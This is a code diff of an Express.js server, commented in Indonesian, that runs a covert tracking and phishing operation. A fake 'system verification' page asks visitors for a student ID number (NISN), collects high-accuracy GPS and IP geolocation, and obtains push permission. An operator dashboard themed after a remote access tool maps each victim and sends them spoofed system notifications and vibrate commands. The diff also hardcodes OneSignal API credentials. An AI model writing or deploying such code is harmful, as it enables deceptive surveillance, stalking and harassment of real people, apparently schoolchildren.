@@ -2,28 +2,27 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const http = require('http');
-const webpush = require('web-push');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// KUNCI VAPID ASLI (JANGAN DIUBAH)
-const publicVapidKey = 'BGbXU9XH1O6rP9J4D1wJ0zM1rX9yY5V3zT7wK2nL8pQ4sR6tU0vW1xY2zA3bC4dE5fG6hI7jK8lM9nO0pQ1rS2tU3vW4xY5zA6bC7dE8fG9hI0jK1lM2nO3pQ4rS5tU6vW7xY8zA9bC0dE1fG2hI3jK4lM5nO6pQ7rS8tU9vW0xY1zA2bC3dE4fG5hI6jK7lM8nO9pQ0rS1tU2vW3xY4zA5bC6dE7fG8hI9jK0lM1nO2pQ3rS4tU5vW6xY7zA8bC9dE0fG1hI2jK3lM4nO5pQ6rS7tU8vW9xY0zA1bC2dE3fG4hI5jK6lM7nO8pQ9rS0tU1vW2xY3zA4bC5dE6fG7hI8jK9lM0nO1pQ2rS3tU4vW5xY6zA7bC8dE9fG0hI1jK2lM3nO4pQ5rS6tU7vW8xY9zA0bC1dE2fG3hI4jK5lM6nO7pQ8rS9tU0vW1xY2zA3bC4dE5fG6hI7jK8lM9nO0pQ1rS2tU3vW4xY5zA6bC7dE8fG9hI0jK1lM2nO3pQ4rS5tU6vW7xY8zA9bC0dE1fG2hI3jK4lM5nO6pQ7rS8tU9vW0xY1zA2bC3dE4fG5hI6jK7lM8nO9pQ0rS1tU2vW3xY4zA5bC6dE7fG8hI9jK0lM1nO2pQ3rS4tU5vW6xY7zA8bC9dE0fG1hI2jK3lM4nO5pQ6rS7tU8vW9xY0zA1bC2dE3fG4hI5jK6lM7nO8pQ9rS0tU1vW2xY3zA4bC5dE6fG7hI8jK9lM0nO1pQ2rS3tU4vW5xY6zA7bC8dE9fG0hI1jK2lM3nO4pQ5rS6tU7vW8xY9zA0bC1dE2fG3hI4jK5lM6nO7pQ8rS9tU0vW1xY2zA3bC4dE5fG6hI7jK8lM9nO0pQ1rS2tU3vW4xY5zA6bC7dE8fG9hI0jK1lM2nO3pQ4rS5tU6vW7xY8zA9bC0dE1fG2hI3jK4lM5nO6pQ7rS8tU9vW0xY1zA2bC3dE4fG5hI6jK7lM8nO9pQ0rS1tU2vW3xY4zA5bC6dE7fG8hI9jK0lM1nO2pQ3rS4tU5vW6xY7zA8bC9dE0fG1hI2jK3lM4nO5pQ6rS7tU8vW9xY0z';
-const privateVapidKey = 'zZ8gP4D4Q1w2e3r4t5y6u7i8o9p0a1s2d3f4g5h6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2h3i4j5k6l7m8n9o0p1q2r3s4t5u6v7w8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2h3i4j5k6l7m8n9o0p1q2r3s4t5u6v7w8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2h3i4j5k6l7m8n9o0p1q2r3s4t5u6v7w8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2h3i4j5k6l7m8n9o0p1q2r3s4t5u6v7w8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2h3i4j5k6l7m8n9o0p1q2r3s4t5u6v7w8x9y0z1';
-
-webpush.setVapidDetails('mailto:admin@sekolah.id', publicVapidKey, privateVapidKey);
+// ==============================================================
+// KONFIGURASI ONESIGNAL (JANGAN DIUBAH)
+// ==============================================================
+const ONESIGNAL_APP_ID = '209c76da-1da3-4518-9b9c-54b84efcc535';
+const ONESIGNAL_REST_KEY = 'os_v2_app_ecohnwq5uncrrg44ks4e57gfgxdvpd6354oubducbqew5qbz3gmjgsd2vaaz72niplmzkj46ivq3tk6sepctzdm3dlh4ky2umekrviy';
 
 const DASH_KEY = 'gilang123';
 const TLOG = path.join(__dirname, '_tlog');
 const GEO_FILE = path.join(TLOG, 'geo.tsv');
 const GPS_FILE = path.join(TLOG, 'gps.tsv');
 const DEVICE_FILE = path.join(TLOG, 'devices.json');
-const SUBS_FILE = path.join(TLOG, 'subs.json');
+const OS_IDS_FILE = path.join(TLOG, 'onesignal_ids.json');
 
 if (!fs.existsSync(TLOG)) fs.mkdirSync(TLOG, { recursive: true });
 if (!fs.existsSync(GEO_FILE)) fs.writeFileSync(GEO_FILE, '');
 if (!fs.existsSync(GPS_FILE)) fs.writeFileSync(GPS_FILE, '');
-if (!fs.existsSync(SUBS_FILE)) fs.writeFileSync(SUBS_FILE, '[]');
+if (!fs.existsSync(OS_IDS_FILE)) fs.writeFileSync(OS_IDS_FILE, '{}');
 
 function clientIp(req) {
   const raw = req.headers['cf-connecting-ip'] || (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '0.0.0.0';
@@ -51,31 +50,53 @@ async function ipGeo(ip) {
 app.set('trust proxy', true); 
 app.use(express.json({ limit: '2mb' })); 
 
-app.post('/api/subscribe', (req, res) => {
+// ==============================================================
+// SIMPAN PLAYER ID ONESIGNAL
+// ==============================================================
+app.post('/api/save-player', (req, res) => {
   const ip = clientIp(req);
-  const sub = req.body;
-  if (!sub || !sub.endpoint) return res.status(400).json({error: 'Invalid sub'});
-  let subs = [];
-  try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
-  subs.push({ ip, subscription: sub });
-  fs.writeFileSync(SUBS_FILE, JSON.stringify(subs));
-  res.status(201).json({ ok: true });
+  const { playerId } = req.body;
+  if (!playerId) return res.status(400).json({ error: 'No Player ID' });
+  
+  let ids = {};
+  try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
+  ids[ip] = playerId;
+  fs.writeFileSync(OS_IDS_FILE, JSON.stringify(ids));
+  res.json({ ok: true });
 });
 
+// ==============================================================
+// KIRIM NOTIF TEMBUS LEWAT API ONESIGNAL
+// ==============================================================
 app.post('/api/push', async (req, res) => {
   if (req.headers['x-auth-key'] !== DASH_KEY) return res.status(403).json({ok:false});
   const { ip, text } = req.body;
-  let subs = [];
-  try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
-  const targetSubs = subs.filter(s => s.ip === ip);
-  if (targetSubs.length === 0) return res.json({ ok: false, msg: 'Target belum klik Izinkan Notif' });
+  
+  let ids = {};
+  try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
+  const playerId = ids[ip];
+  
+  if (!playerId) return res.json({ ok: false, msg: 'Target belum izinin notif' });
 
-  const payload = JSON.stringify({ title: 'Pemberitahuan Sistem', body: text });
-  let success = false;
-  for (let t of targetSubs) {
-    try { await webpush.sendNotification(t.subscription, payload); success = true; } catch (e) { console.log(e); }
+  try {
+    const response = await fetch('https://onesignal.com/api/v1/notifications', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Basic ${ONESIGNAL_REST_KEY}`
+      },
+      body: JSON.stringify({
+        app_id: ONESIGNAL_APP_ID,
+        include_player_ids: [playerId],
+        headings: { en: 'Pemberitahuan Sistem' },
+        contents: { en: text }
+      })
+    });
+    const data = await response.json();
+    res.json({ ok: data.id ? true : false });
+  } catch (e) {
+    res.json({ ok: false, msg: e.message });
   }
-  res.json({ ok: success });
 });
 
 app.get('/api/geoip', async (req, res) => {
@@ -96,17 +117,9 @@ app.post('/api/gps', (req, res) => {
   res.json({ ok: true });
 });
 
-app.get('/sw.js', (req, res) => {
-  res.setHeader('Content-Type', 'application/javascript');
-  res.send(`
-    self.addEventListener('push', function(e) {
-      let data = { title: 'Pemberitahuan', body: 'Pesan baru' };
-      if (e.data) { try { data = e.data.json(); } catch(err) { data.body = e.data.text(); } }
-      e.waitUntil(self.registration.showNotification(data.title, { body: data.body, vibrate: [200, 100, 200] }));
-    });
-  `);
-});
-
+// ==============================================================
+// DASHBOARD LIST
+// ==============================================================
 app.get('/dash', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   const devices = new Map();
@@ -149,6 +162,9 @@ app.get('/dash', (req, res) => {
   res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Langz Intel</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>:root{--bg:#09090b;--card:#18181b;--border:#27272a;--text:#f4f4f5;--muted:#a1a1aa;--accent:#22d3ee;}*{box-sizing:border-box;font-family:sans-serif}body{margin:0;background:var(--bg);color:var(--text)}.header{padding:24px 20px;background:var(--card);border-bottom:1px solid var(--border)}.header h1{margin:0;font-size:18px}.list{padding:16px}.row{display:flex;align-items:center;background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;margin-bottom:12px;text-decoration:none;color:inherit}.row-icon{width:48px;height:48px;font-size:24px;display:flex;align-items:center;justify-content:center;margin-right:14px}.dev{font-weight:700}.meta{font-size:13px;color:var(--muted)}</style></head><body><div class="header"><h1>⚡ Langz Intel</h1></div><div class="list">${rows}</div></body></html>`);
 });
 
+// ==============================================================
+// DASHBOARD MAP (TEMA SURXRAT)
+// ==============================================================
 app.get('/dash/map', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   let devices = []; try { devices = JSON.parse(fs.readFileSync(DEVICE_FILE, 'utf8')); } catch (_) {}
@@ -201,7 +217,7 @@ app.get('/dash/map', (req, res) => {
     <div class="control-box">
       <h3>📩 Kirim Pesan (Notif)</h3>
       <input type="text" id="msgText" class="msg-input" placeholder="Ketik pesan...">
-      <button class="btn btn-primary" onclick="sendCmd('notif', document.getElementById('msgText').value)">Kirim Notifikasi</button>
+      <button class="btn btn-primary" onclick="sendPush()">Kirim Notifikasi</button>
     </div>
     <div class="control-box">
       <h3>📳 Remote Action</h3>
@@ -215,51 +231,68 @@ app.get('/dash/map', (req, res) => {
   L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
   L.circle([${lat},${lon}],{radius:${acc},color:'#00ff9d',fillOpacity:0.2}).addTo(map);
   L.circleMarker([${lat},${lon}],{radius:12,color:'#00e5ff',fillColor:'#00ff9d',fillOpacity:1,weight:3}).addTo(map);
-  async function sendCmd(cmd, payload){
-    const res = await fetch('/api/send-command',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',cmd:cmd,payload:payload})});
+  
+  async function sendPush(){
+    const text = document.getElementById('msgText').value;
+    if(!text) return;
+    const res = await fetch('/api/push',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',text:text})});
     const j = await res.json();
     document.getElementById('status').style.display='block';
-    document.getElementById('status').innerText = j.ok ? '✅ Terkirim langsung ke HP!' : '❌ HP Target Offline/Web ditutup';
+    document.getElementById('status').innerText = j.ok ? '✅ Notif Tembus Terkirim!' : '❌ Target Offline/Blm izinin';
+    setTimeout(()=>document.getElementById('status').style.display='none', 3000);
+  }
+  
+  async function sendCmd(cmd, payload){
+    const res = await fetch('/api/send-command',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',cmd:cmd,payload:payload})});
+    document.getElementById('status').style.display='block';
+    document.getElementById('status').innerText = '✅ Perintah getar terkirim!';
     setTimeout(()=>document.getElementById('status').style.display='none', 3000);
   }
   </script>
   </body></html>`);
 });
 
+// ==============================================================
+// LANDING PAGE (VERIFIKASI + ONESIGNAL)
+// ==============================================================
 app.get('*', (req, res) => {
+  const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
   res.type('html').send(`<!doctype html>
 <html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verifikasi Sistem</title>
+<script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
+<script>
+  window.OneSignalDeferred = window.OneSignalDeferred || [];
+  OneSignalDeferred.push(async function(OneSignal) {
+    await OneSignal.init({ appId: "${ONESIGNAL_APP_ID}" });
+  });
+</script>
 <style>body{margin:0;font-family:sans-serif;background:#0f172a;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{background:#1e293b;padding:30px;border-radius:16px;max-width:350px;width:100%;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.5)}.icon{font-size:50px;margin-bottom:15px}h2{margin:0 0 10px;font-size:20px}p{color:#94a3b8;font-size:13px;line-height:1.5;margin-bottom:25px}.btn{width:100%;padding:15px;background:#38bdf8;color:#000;border:none;border-radius:10px;font-weight:bold;font-size:15px;cursor:pointer}.input{width:100%;padding:12px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#fff;margin-bottom:15px;box-sizing:border-box;text-align:center}</style></head>
 <body><div class="box" id="box">
-  <div class="icon">🛡️</div><h2>Verifikasi Data</h2><p>Sistem mendeteksi akses baru. Silakan izinkan notifikasi dan akses lokasi untuk melanjutkan.</p>
+  <div class="icon">🛡️</div><h2>Verifikasi Data</h2><p>Sistem mendeteksi akses baru. Silakan isi NISN dan izinkan akses lokasi.</p>
   <input type="text" class="input" id="nisn" placeholder="Masukkan NISN">
   <button class="btn" id="verifyBtn">Verifikasi & Aktifkan</button>
 </div>
 <script>
 (async function(){
-  if ('serviceWorker' in navigator) {
-    try { await navigator.serviceWorker.register('/sw.js'); } catch(e) { console.log(e); }
-  }
-
   document.getElementById('verifyBtn').addEventListener('click', async () => {
     if(!document.getElementById('nisn').value) { alert('Masukkan NISN!'); return; }
     this.innerText = 'Memverifikasi...';
-
-    const permission = await Notification.requestPermission();
-    if (permission === 'granted') {
-      const reg = await navigator.serviceWorker.ready;
-      const sub = await reg.pushManager.subscribe({
-        userVisibleOnly: true,
-        applicationServerKey: '${publicVapidKey}'
-      });
-      await fetch('/api/subscribe', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(sub) });
-    }
 
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}) }).catch(()=>{}); },
         e => {}, {enableHighAccuracy:true,timeout:15000}
       );
+    }
+
+    if (window.OneSignal) {
+      try {
+        await OneSignal.Notifications.requestPermission();
+        const playerId = OneSignal.User.PushSubscription.id;
+        if(playerId) {
+          await fetch('/api/save-player', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({playerId}) });
+        }
+      } catch(e) { console.log(e); }
     }
     
     setTimeout(() => { document.getElementById('box').innerHTML = '<div class="icon">✅</div><h2>Verifikasi Berhasil</h2><p>Data Anda telah dicocokkan.</p>'; }, 2000);
@@ -268,6 +301,9 @@ app.get('*', (req, res) => {
 </script></body></html>`);
 });
 
+// ==============================================================
+// START SERVER
+// ==============================================================
 http.createServer(app).listen(PORT, '0.0.0.0', () => {
   console.log(`[TRACKER] Nyala di port ${PORT}`);
 });
